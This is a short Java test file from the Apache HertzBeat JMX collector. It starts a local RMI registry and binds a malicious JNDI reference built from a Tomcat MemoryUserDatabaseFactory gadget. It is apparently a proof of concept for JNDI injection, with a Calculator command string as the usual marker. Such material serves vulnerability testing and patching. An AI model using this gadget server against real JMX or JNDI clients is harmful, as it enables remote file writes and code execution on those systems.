package org.apache.hertzbeat.collector.collect.jmx;

import org.apache.naming.ResourceRef;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.Properties;

public class JndiServerTest {
    private static String command = "/System/Applications/Calculator.app/Contents/MacOS/Calculator";

    public static ResourceRef exploit() {
        ResourceRef ref = new ResourceRef("org.apache.catalina.UserDatabase", null, "", "",
                true, "org.apache.catalina.users.MemoryUserDatabaseFactory", null);
        ref.add(new StringRefAddr("pathname", "/tmp/deadbeef"));
        ref.add(new StringRefAddr("readonly", "false"));
        return ref;
    }

    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.createRegistry(1097);
        Properties props = new Properties();
        props.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
        props.put(Context.PROVIDER_URL, "rmi://localhost:1097");
        Context context = new InitialContext(props);
        context.bind("Object", exploit());
        context.close();
    }
}